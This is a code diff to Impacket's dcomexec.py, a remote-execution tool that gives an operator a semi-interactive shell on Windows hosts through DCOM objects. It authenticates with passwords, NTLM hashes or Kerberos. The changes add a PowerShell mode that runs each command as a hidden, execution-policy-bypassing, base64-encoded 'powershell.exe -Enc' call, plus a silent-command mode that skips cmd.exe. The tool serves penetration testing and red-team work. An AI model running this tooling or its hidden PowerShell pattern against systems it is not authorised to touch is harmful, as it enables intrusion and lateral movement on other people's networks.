@@ -39,17 +39,19 @@ import ntpath
 import os
 import sys
 import time
+from base64 import b64encode
 
 from six import PY2, PY3
 from impacket import version
 from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
     VARIANT, VARENUM, DISPATCH_METHOD
-from impacket.dcerpc.v5.dcomrt import DCOMConnection
+from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
 from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
     OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
     IRemUnknown2, INTERFACE
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.examples import logger
+from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
 from impacket.krb5.keytab import Keytab
 
@@ -58,7 +60,7 @@ CODEC = sys.stdout.encoding
 
 class DCOMEXEC:
     def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
-                 noOutput=False, doKerberos=False, kdcHost=None, dcomObject=None):
+                 noOutput=False, doKerberos=False, kdcHost=None, dcomObject=None, shell_type=None):
         self.__command = command
         self.__username = username
         self.__password = password
@@ -71,6 +73,7 @@ class DCOMEXEC:
         self.__doKerberos = doKerberos
         self.__kdcHost = kdcHost
         self.__dcomObject = dcomObject
+        self.__shell_type = shell_type
         self.shell = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
@@ -95,8 +98,8 @@ class DCOMEXEC:
                       oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                       target=interface.get_target()))
 
-    def run(self, addr):
-        if self.__noOutput is False:
+    def run(self, addr, silentCommand=False):
+        if self.__noOutput is False and silentCommand is False:
             smbConnection = SMBConnection(addr, addr)
             if self.__doKerberos is False:
                 smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
@@ -160,17 +163,21 @@ class DCOMEXEC:
 
                 iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
-                self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
+                self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
             else:
                 resp = iDocument.GetIDsOfNames(('Application',))
                 resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
                 iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
-                self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
+                self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
 
             if self.__command != ' ':
-                self.shell.onecmd(self.__command)
+                try:
+                    self.shell.onecmd(self.__command)
+                except TypeError:
+                    if not silentCommand:
+                        raise
                 if self.shell is not None:
                     self.shell.do_exit('')
             else:
@@ -193,15 +200,18 @@ class DCOMEXEC:
         dcom.disconnect()
 
 class RemoteShell(cmd.Cmd):
-    def __init__(self, share, quit, executeShellCommand, smbConnection):
+    def __init__(self, share, quit, executeShellCommand, smbConnection, shell_type, silentCommand=False):
         cmd.Cmd.__init__(self)
         self._share = share
         self._output = '\\' + OUTPUT_FILENAME
         self.__outputBuffer = ''
         self._shell = 'cmd.exe'
+        self.__shell_type = shell_type
+        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__quit = quit
         self._executeShellCommand = executeShellCommand
         self.__transferClient = smbConnection
+        self._silentCommand = silentCommand
         self._pwd = 'C:\\windows\\system32'
         self._noOutput = False
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
@@ -220,8 +230,8 @@ class RemoteShell(cmd.Cmd):
         print("""
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
- put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
- get {file}                 - downloads pathname to the current local dir
+ lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ lget {file}                 - downloads pathname to the current local dir
  ! {cmd}                    - executes a local shell cmd
 """)
 
@@ -234,7 +244,7 @@ class RemoteShell(cmd.Cmd):
             except Exception as e:
                 logging.error(str(e))
 
-    def do_get(self, src_path):
+    def do_lget(self, src_path):
         try:
             import ntpath
             newPath = ntpath.normpath(ntpath.join(self._pwd, src_path))
@@ -249,7 +259,7 @@ class RemoteShell(cmd.Cmd):
             os.remove(filename)
             pass
 
-    def do_put(self, s):
+    def do_lput(self, s):
         try:
             params = s.split(' ')
             if len(params) > 1:
@@ -283,6 +293,10 @@ class RemoteShell(cmd.Cmd):
                                              0, [], [])
         return True
 
+    def do_EOF(self, s):
+        print()
+        return self.do_exit(s)
+
     def emptyline(self):
         return False
 
@@ -299,6 +313,8 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote('cd ')
             self._pwd = self.__outputBuffer.strip('\r\n')
             self.prompt = (self._pwd + '>')
+            if self.__shell_type == 'powershell':
+                    self.prompt = 'PS ' + self.prompt + ' '
             self.__outputBuffer = ''
 
     def default(self, line):
@@ -315,7 +331,9 @@ class RemoteShell(cmd.Cmd):
                 self._pwd = line
                 self.execute_remote('cd ')
                 self._pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = self._pwd + '>'
+                self.prompt = (self._pwd + '>')
+                if self.__shell_type == 'powershell':
+                    self.prompt = 'PS ' + self.prompt + ' '
                 self.__outputBuffer = ''
         else:
             if line != '':
@@ -351,8 +369,16 @@ class RemoteShell(cmd.Cmd):
                     return self.get_output()
         self.__transferClient.deleteFile(self._share, self._output)
 
-    def execute_remote(self, data):
-        command = '/Q /c ' + data
+    def execute_remote(self, data, shell_type='cmd'):
+        if self._silentCommand is True:
+            self._shell = data.split()[0]
+            command = ' '.join(data.split()[1:])
+        else:
+            if shell_type == 'powershell':
+                data = '$ProgressPreference="SilentlyContinue";' + data
+                data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+            command = '/Q /c ' + data
+
         if self._noOutput is False:
             command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output + ' 2>&1'
 
@@ -407,13 +433,21 @@ class RemoteShell(cmd.Cmd):
         self.get_output()
 
     def send_data(self, data):
-        self.execute_remote(data)
+        self.execute_remote(data, self.__shell_type)
         print(self.__outputBuffer)
         self.__outputBuffer = ''
 
 class RemoteShellMMC20(RemoteShell):
-    def execute_remote(self, data):
-        command = '/Q /c ' + data
+    def execute_remote(self, data, shell_type='cmd'):
+        if self._silentCommand is True:
+            self._shell = data.split()[0]
+            command = ' '.join(data.split()[1:])
+        else:
+            if shell_type == 'powershell':
+                data = '$ProgressPreference="SilentlyContinue";' + data
+                data = self._RemoteShell__pwsh + b64encode(data.encode('utf-16le')).decode()
+            command = '/Q /c ' + data
+
         if self._noOutput is False:
             command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output  + ' 2>&1'
 
@@ -511,6 +545,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(add_help = True, description = "Executes a semi-interactive shell using the "
                                                                     "ShellBrowserWindow DCOM object.")
+
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument('-share', action='store', default = 'ADMIN$', help='share where the output will be grabbed from '
                                                                            '(default ADMIN$)')
@@ -525,9 +560,14 @@ if __name__ == '__main__':
                           'again with -codec and the corresponding codec ' % CODEC)
     parser.add_argument('-object', choices=['ShellWindows', 'ShellBrowserWindow', 'MMC20'], nargs='?', default='ShellWindows',
                         help='DCOM object to be used to execute the shell command (default=ShellWindows)')
-
+    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
+                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
+    parser.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
+                        'a command processor for the semi-interactive shell')
     parser.add_argument('command', nargs='*', default = ' ', help='command to execute at the target. If empty it will '
                                                                   'launch a semi-interactive shell')
+    parser.add_argument('-silentcommand', action='store_true', default = False,
+                        help='does not execute cmd.exe to run given command (no output, cannot run dir/cd/etc.)')
 
     group = parser.add_argument_group('authentication')
 
@@ -562,6 +602,9 @@ if __name__ == '__main__':
     if ' '.join(options.command) == ' ' and options.nooutput is True:
         logging.error("-nooutput switch and interactive shell not supported")
         sys.exit(1)
+    if options.silentcommand and options.command == ' ':
+        logging.error("-silentcommand switch and interactive shell not supported")
+        sys.exit(1)
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
@@ -570,15 +613,15 @@ if __name__ == '__main__':
     else:
         logging.getLogger().setLevel(logging.INFO)
 
-    import re
+    if options.com_version is not None:
+        try:
+            major_version, minor_version = options.com_version.split('.')
+            COMVERSION.set_default_version(int(major_version), int(minor_version))
+        except Exception:
+            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
+            sys.exit(1)
 
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
-        options.target).groups('')
-
-    #In case the password contains '@'
-    if '@' in address:
-        password = password + '@' + address.rpartition('@')[0]
-        address = address.rpartition('@')[2]
+    domain, username, password, address = parse_target(options.target)
 
     try:
         if options.A is not None:
@@ -600,8 +643,8 @@ if __name__ == '__main__':
             options.k = True
 
         executer = DCOMEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
-                            options.share, options.nooutput, options.k, options.dc_ip, options.object)
-        executer.run(address)
+                            options.share, options.nooutput, options.k, options.dc_ip, options.object, options.shell_type)
+        executer.run(address, options.silentcommand)
     except (Exception, KeyboardInterrupt) as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
